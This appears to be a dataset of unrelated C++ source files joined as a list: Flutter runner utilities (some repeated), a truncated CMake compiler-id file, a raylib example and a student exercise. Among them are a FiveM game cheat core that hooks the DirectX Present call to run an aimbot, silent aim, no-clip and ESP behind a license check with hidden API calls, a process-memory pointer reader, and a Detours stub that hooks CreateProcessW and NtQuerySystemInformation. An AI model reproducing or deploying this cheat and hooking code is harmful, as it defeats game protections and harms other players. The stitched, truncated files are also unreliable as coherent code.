    "#include \"memory.h\"\r\n\r\nuintptr_t GetModuleBaseAddress(DWORD pID, const char* modName) {\r\n    MODULEENTRY32 modEntry;\r\n    modEntry.dwSize = sizeof(modEntry);\r\n    uintptr_t baseAddr = 0;\r\n\r\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pID);\r\n\r\n    if (hSnap != INVALID_HANDLE_VALUE) {\r\n        if (Module32First(hSnap, &modEntry)) {\r\n            do {\r\n                if (!strcmp(modEntry.szModule, modName)) {\r\n                    baseAddr = (uintptr_t)modEntry.modBaseAddr;\r\n                    break;\r\n                }\r\n            } while (Module32Next(hSnap, &modEntry));\r\n        }\r\n        CloseHandle(hSnap);\r\n    }\r\n\r\n    return baseAddr;\r\n}\r\n\r\nuintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector<unsigned int> offsets)\r\n{\r\n    uintptr_t addr = ptr;\r\n    for (unsigned int i = 0; i < offsets.size(); ++i)\r\n    {\r\n        ReadProcessMemory(hProc, (BYTE*)addr, &addr, sizeof(addr), 0);\r\n        addr += offsets[i];\r\n    }\r\n    return addr;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mental_in\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "#include<iostream>\r\n#include<list>\r\nusing namespace std;\r\n\r\nclass Youtube{\r\n    public:\r\n\t      string name;\r\n\t      int subs;\r\n\t\r\n\tpublic:\r\n\t\t\tYoutube(){\r\n\t\t\tthis->name =\"None\";\r\n\t\t\tthis->subs =0;\r\n\t\t}\r\n\t\t\r\n\t\tYoutube(string name,int subs){\r\n\t\t\tthis->name =name;\r\n\t\t\tthis->subs =subs;\r\n\t\t}\r\n\t\tvoid set_data(){\r\n\t\t\tcout<<\"enter the channel name\"<<endl;\r\n\t\t\tcin>>this->name;\r\n\t\t\tcout<<\"enter the subscriber\"<<endl;\r\n\t\t\tcin>>this->subs;\r\n\t\t}\r\n\t\r\n\t\tvoid print_data(){\r\n\t\t\tcout<<\"your youtube channel name is :\"<<this->name<<endl;\r\n\t\t\tcout<<\"yiur subscribers are :\"<<this->subs<<endl;\r\n\t\t}\r\n\t\t\r\n};\r\nclass Mycollection{\r\n\tpublic:\r\n    list<Youtube>Mylist;\r\n\tvoid operator+=(Youtube& channel){\r\n\t\tMylist.push_back(channel);\r\n\t} \r\n};\r\nostream& operator<<(ostream& COUT,Youtube YT){\r\n    cout<<\"the name of channel is : \"<<endl;\r\n\tCOUT<<YT.name;\r\n\tcout<<endl;\r\n\t   cout<<\"the subscriber are : \"<<endl;\r\n\tCOUT<<YT.subs;\r\n\treturn COUT;\r\n};\r\n\r\nostream& operator<<(ostream& COUT,Mycollection mc){\r\n\tfor(Youtube YT:mc.Mylist)\r\n\t{\r\n\t\tCOUT<<YT;\r\n\t\tcout<<endl;\r\n\t}\r\n\treturn COUT;\r\n};\r\n\r\n\r\n\r\nint main(){\r\n    \r\n    Youtube YT1(\"DKTE\",2500);\r\n\tYoutube YT2(\"SIT\",250);\r\n\tMycollection mc;\r\n\tmc+=YT1;\r\n\tmc+=YT2;\r\n\tcout<<mc;\r\n\treturn 0;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*******************************************************************************************\n*\n*   raylib [textures] example - Retrieve image data from texture: LoadImageFromTexture()\n*\n*   NOTE: Images are loaded in CPU memory (RAM); textures are loaded in GPU memory (VRAM)\n*\n*   Example originally created with raylib 1.3, last time updated with raylib 4.0\n*\n*   Example licensed under an unmodified zlib/libpng license, which is an OSI-certified,\n*   BSD-like license that allows static linking with closed source software\n*\n*   Copyright (c) 2015-2024 Ramon Santamaria (@raysan5)\n*\n********************************************************************************************/\n\n#include \"raylib.h\"\n\n//------------------------------------------------------------------------------------\n// Program main entry point\n//------------------------------------------------------------------------------------\nint main(void)\n{\n    // Initialization\n    //--------------------------------------------------------------------------------------\n    const int screenWidth = 800;\n    const int screenHeight = 450;\n\n    InitWindow(screenWidth, screenHeight, \"raylib [textures] example - texture to image\");\n\n    // NOTE: Textures MUST be loaded after Window initialization (OpenGL context is required)\n\n    Image image = LoadImage(\"assets/raylib_logo.png\");  // Load image data into CPU memory (RAM)\n    Texture2D texture = LoadTextureFromImage(image);       // Image converted to texture, GPU memory (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload image data from CPU memory (RAM)\n\n\n    image = LoadImageFromTexture(texture);                 // Load image from GPU texture (VRAM -> RAM)\n    UnloadTexture(texture);                                // Unload texture from GPU memory (VRAM)\n\n    texture = LoadTextureFromImage(image);                 // Recreate texture from retrieved image data (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload retrieved image data from CPU memory (RAM)\n    //---------------------------------------------------------------------------------------\n\n    // Main game loop\n    while (!WindowShouldClose())    // Detect window close button or ESC key\n    {\n        // Update\n        //----------------------------------------------------------------------------------\n        // TODO: Update your variables here\n        //----------------------------------------------------------------------------------\n\n        // Draw\n        //----------------------------------------------------------------------------------\n        BeginDrawing();\n\n            ClearBackground(RAYWHITE);\n\n            DrawTexture(texture, screenWidth/2 - texture.width/2, screenHeight/2 - texture.height/2, WHITE);\n\n            DrawText(\"this IS a texture loaded from an image!\", 300, 370, 10, GRAY);\n\n        EndDrawing();\n        //----------------------------------------------------------------------------------\n    }\n\n    // De-Initialization\n    //--------------------------------------------------------------------------------------\n    UnloadTexture(texture);       // Texture unloading\n\n    CloseWindow();                // Close window and OpenGL context\n    //--------------------------------------------------------------------------------------\n\n    return 0;\n}",
